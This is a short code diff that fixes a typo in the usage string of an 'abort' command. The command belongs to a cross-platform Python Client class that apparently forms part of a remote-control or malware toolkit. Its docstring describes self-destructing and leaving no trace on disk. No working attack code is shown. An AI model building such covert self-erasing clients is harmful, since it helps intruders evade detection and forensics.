@@ -1618,7 +1618,7 @@ class Client():
             return "{} returned error: '{}'".format(self.scan.func_name, str(e))        
 
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='abortddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd')
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
     def abort(self):
         """
         self-destruct and leave no trace on the disk
